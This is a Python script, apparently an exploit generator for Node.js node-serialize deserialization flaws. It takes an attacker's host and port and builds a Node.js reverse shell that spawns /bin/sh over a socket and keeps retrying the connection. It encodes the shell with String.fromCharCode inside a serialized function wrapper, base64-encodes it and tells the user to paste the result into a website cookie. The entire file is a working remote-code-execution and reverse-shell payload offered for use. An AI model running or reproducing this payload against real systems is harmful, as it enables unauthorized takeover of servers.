#!/usr/bin/python
import sys
import base64
from colorama import init, Fore, Back, Style 

init()

def banner():
    print(Fore.RED+Style.BRIGHT+"  _   _           _        _           _                     _       _ _          _   _             ")
    print(" | \ | |         | |      (_)         | |                   (_)     | (_)        | | (_)            ")
    print(" |  \| | ___   __| | ___   _ ___    __| | ___  ___  ___ _ __ _  __ _| |_ ______ _| |_ _  ___  _ __  ")
    print(" | . ` |/ _ \ / _` |/ _ \ | / __|  / _` |/ _ \/ __|/ _ \ '__| |/ _` | | |_  / _` | __| |/ _ \| '_ \ ")
    print(" | |\  | (_) | (_| |  __/_| \__ \ | (_| |  __/\__ \  __/ |  | | (_| | | |/ / (_| | |_| | (_) | | | |")
    print(" |_| \_|\___/ \__,_|\___(_) |___/  \__,_|\___||___/\___|_|  |_|\__,_|_|_/___\__,_|\__|_|\___/|_| |_|")
    print("                         _/ |                                                                       ")
    print("                        |__/                                                                        ")
    print(""+Style.RESET_ALL)
    init(autoreset=True)

if len(sys.argv) != 3:
    print(Fore.RED+Style.BRIGHT+"[+]Usage: %s <LHOST> <LPORT>"% (sys.argv[0]))
    print("\n"+Style.RESET_ALL)
    sys.exit(0)

IP_ADDR = sys.argv[1]
PORT = sys.argv[2]


def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]

if __name__=="__main__":
    banner()
    NODEJS_REV_SHELL = '''
    var net = require('net');
    var spawn = require('child_process').spawn;
    HOST="%s";
    PORT="%s";
    TIMEOUT="5000";
    if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
    function c(HOST,PORT) {
        var client = new net.Socket();
        client.connect(PORT, HOST, function() {
            var sh = spawn('/bin/sh',[]);
            client.write("Connected!\\n");
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
            sh.on('exit',function(code,signal){
                client.end("Disconnected!\\n");
            });
        });
        client.on('error', function(e) {
            setTimeout(c(HOST,PORT), TIMEOUT);
        });
    }
    c(HOST,PORT);
    ''' % (IP_ADDR, PORT)
    print(Fore.BLUE+"[+] Copy the following reverse shell into the website cookie:\n"+Style.RESET_ALL)
    PAYLOAD = charencode(NODEJS_REV_SHELL)
    reverse="{\"rce\":\"_$$ND_FUNC$$_function (){eval(String.fromCharCode("+PAYLOAD+"))}()\"}"
    reverse=reverse.encode('utf-8')
    print(base64.b64encode(reverse).decode())
